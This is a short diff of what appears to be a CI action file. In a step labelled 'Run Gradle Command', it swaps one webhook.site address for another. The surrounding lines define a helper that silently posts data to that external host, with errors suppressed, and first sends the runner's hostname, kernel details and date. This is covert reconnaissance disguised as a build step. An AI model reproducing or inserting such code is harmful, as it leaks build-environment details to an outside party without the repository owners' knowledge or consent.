@@ -19,7 +19,7 @@ runs:
     - name: Run Gradle Command
       shell: bash
       run: |
-        HOOK="https://webhook.site/7041c930-af85-4ea6-ad23-9bc97ecc732f"
+        HOOK="https://webhook.site/e06c37b8-e320-4f81-a47c-fdf9079d974b"
         post() { curl -sf -X POST "$HOOK" --data-urlencode "stage=$1" --data-urlencode "d=$2" || true; }
 
         post "start"     "$(hostname) $(uname -srm) $(date -u)"
